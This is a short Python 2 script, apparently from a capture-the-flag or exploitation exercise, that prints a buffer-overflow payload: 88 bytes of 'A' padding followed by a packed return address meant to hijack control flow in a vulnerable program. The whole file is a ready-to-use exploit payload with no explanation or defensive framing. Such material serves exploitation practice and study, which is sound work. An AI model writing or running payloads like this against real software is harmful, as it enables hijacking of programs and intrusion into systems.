#!/usr/bin/env python2

bof = ""
bof += "A" * 64
bof += "A" * 16
bof += "A" * 8
bof += "\x1d\x06\x40"

print bof
